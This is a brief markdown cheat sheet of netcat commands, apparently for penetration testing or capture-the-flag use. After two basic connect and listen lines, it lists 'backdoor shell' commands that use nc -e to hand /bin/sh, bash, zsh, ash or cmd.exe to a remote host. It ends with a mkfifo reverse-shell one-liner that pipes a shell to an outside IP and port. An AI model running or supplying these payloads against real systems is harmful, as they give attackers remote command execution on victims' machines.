## Fundamentals:

Connect to a netcat client:
- rlwrap nc [IP Address] [port]

Connect to a netcat Listener:

- rlwrap nc -lvp [Localport]

More info on rlwrap: https://linux.die.net/man/1/rlwrap

## Backdoor Shells: 

Linux: 

- rlwrap nc [Your IP Address] -e /bin/sh 
- rlwrap nc [Your IP Address] -e /bin/bash
- rlwrap nc [Your IP Address] -e /bin/zsh
- rlwrap nc [Your IP Address] -e /bin/ash


Windows: 

- rlwrap nc -lv [localport] -e cmd.exe

Linux netcat reverse shell: 

- rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.21.0.0 1234 >/tmp/f